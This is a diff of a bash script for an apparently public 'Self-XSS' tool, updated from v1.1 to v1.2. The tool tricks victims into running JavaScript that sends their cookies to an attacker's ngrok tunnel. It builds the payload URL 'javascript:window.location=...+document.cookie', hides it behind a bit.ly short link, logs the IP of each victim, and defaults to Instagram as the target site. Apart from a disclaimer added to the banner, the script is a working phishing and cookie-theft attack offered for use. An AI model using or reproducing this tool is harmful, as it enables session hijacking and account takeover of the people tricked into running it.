@@ -1,5 +1,5 @@
 #!/bin/bash
-# Self-XSS v1.1
+# Self-XSS v1.2
 # coded by: github.com/thelinuxchoice/self-xss
 # Twitter: @linux_choice
 # Disclaimer: Attacking targets without prior mutual consent is illegal.
@@ -20,13 +20,17 @@ printf " \e[1;77m   _____ ________    ______  \e[0m\e[91m _  ____________ \e[0m\
 printf " \e[1;77m  / ___// ____/ /   / ____/  \e[0m\e[91m| |/ / ___/ ___/ \e[0m\n"
 printf ' \e[1;77m  \__ \/ __/ / /   / /_______\e[0m\e[91m|   /\__ \'$lazy''$lazy'__ \  \e[0m\n'
 printf " \e[1;77m ___/ / /___/ /___/ __/_____/\e[0m\e[91m   |___/ /__/ /  \e[0m\n"
-printf " \e[1;77m/____/_____/_____/_/       \e[0m\e[91m/_/|_/____/____/\e[0m\e[1;77mv1.1   \e[0m\n"
+printf " \e[1;77m/____/_____/_____/_/       \e[0m\e[91m/_/|_/____/____/\e[0m\e[1;77mv1.2   \e[0m\n"
                                              
 
 printf "\e[1;77m by github.com/thelinuxchoice/self-xss\e[0m \n"
 
-printf " Twitter: @linux_choice\n"
+printf " \e[34mtwitter:\e[0m\e[77m @linux_choice\e[0m\n"
 
+printf "\n\e[1;91m Disclaimer: this tool is designed for security\n"
+printf " testing in an authorized simulated cyberattack\n"
+printf " Attacking targets without prior mutual consent\n"
+printf " is illegal!\n"
 
 }
 
@@ -73,12 +77,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[1;93m Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target executed the malicious code!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -131,7 +135,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Server:\e[0m\e[1;77m %s\n' $send_l
 ngrok_server() {
 
 if [[ $email == "" ]]; then
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Bit.ly Credentials \e[0m\n'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Bit.ly Credentials (Register for free) \e[0m\n'
 printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Email: \e[0m"
 read email
 fi
@@ -152,6 +156,7 @@ command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not inst
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
+arch3=$(uname -a | grep -o '64bit' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
@@ -164,6 +169,18 @@ printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget
 exit 1
 fi
 
+elif [[ $arch3 == *'64bit'* ]] ; then
+
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-amd64.zip ]]; then
+unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-amd64.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
 else
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
@@ -185,7 +202,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Server:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok server:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload
 bitlink
@@ -198,32 +215,32 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
+#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+#default_option_server="1"
+#read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' #option_server
+#option_server="${option_server:-${default_option_server}}"
 
 default_website="https://instagram.com"
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a website (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m ): \e[0m" $default_website
 read website_link
 website_link="${website_link:-${default_website}}"
 
-if [[ $option_server -eq 1 ]]; then
+#if [[ $option_server -eq 1 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-start
+#command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+#start
 
-elif [[ $option_server -eq 2 ]]; then
-ngrok=true
+#elif [[ $option_server -eq 2 ]]; then
+#ngrok=true
 ngrok_server
 
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-start1
-fi
+#else
+#printf "\e[1;93m [!] Invalid option!\e[0m\n"
+#sleep 1
+#clear
+#start1
+#fi
 
 }
 
@@ -239,11 +256,11 @@ sed 's+redirect_link+'$website_link'+g' get.php > index.php
 
 bitlink() {
 
-if [[ $ngrok == true ]]; then
+#if [[ $ngrok == true ]]; then
 get_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-else
-get_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-fi
+#else
+#get_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+#fi
 
 token=$(curl -s -u "$email:$password" -X POST "https://api-ssl.bitly.com/oauth/access_token")
 
@@ -252,15 +269,20 @@ guid=$(curl -s -X GET "https://api-ssl.bitly.com/v4/groups" -H "Authorization: B
 
 long_url="$website_link/javascript:window.location='$get_link/?c='+document.cookie"
 
-bitly_link=$(curl -s -X POST "https://api-ssl.bitly.com/v4/bitlinks" -H "Authorization: Bearer $token" -H "Content-Type: application/json" -d "{\"group_guid\":\"$guid\", \"long_url\": \"$long_url\" }" | grep -o '"link":"http://bit.ly/[0-9a-zA-Z]*\"' | cut -d '"' -f4)
+bitly_link=$(curl -s -X POST "https://api-ssl.bitly.com/v4/bitlinks" -H "Authorization: Bearer $token" -H "Content-Type: application/json" -d "{\"group_guid\":\"$guid\", \"long_url\": \"$long_url\" }" | grep -o '"link":"https://bit.ly/[0-9a-zA-Z]*\"' | cut -d '"' -f4)
 
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Usage:\e[0m\n"
-printf "   \e[91m Self-XSS operates by tricking users into running malicious content into their browsers\n"
-printf "    This script generates a bit.ly link pointing to: website.com/javascript:malicious_code\n"
-printf "    After visiting the shorten link, the user is tricked into running the content after website.com/\n"
-printf "    If executed, the malicious code grabs the cookies from website.com\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] Bit.ly link:\e[0m\e[1;77m %s\e[0m\n" $bitly_link
+printf "\n\e[1;92m[\e[0m+\e[1;77m] Usage:\e[0m\n\n"
+printf "    \e[91mSelf-XSS operates by tricking users into running malicious\n"
+printf "    content into their browsers\n"
+printf "    This script generates a bit.ly link pointing to:\n"
+printf "\e[0m\e[1;77m    %s/javascript:malicious_code\e[0m\n" $website_link
+printf "    \e[91mAfter visiting the shorten link, the user is tricked into running\n"
+printf "    the javascript code after %s/\n" $website_link
+printf "    If executed, the malicious code grabs the cookies from:\n"
+printf "    %s\n\n" $website_link
+printf "\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[1;93m Direct link:\e[0m\e[1;77m %s \e[0m\n" $long_url
+printf "\e[1;92m[\e[0m+\e[1;92m] Send the Bit.ly link:\e[0m\e[1;77m %s\e[0m\n" $bitly_link
 
 
 }
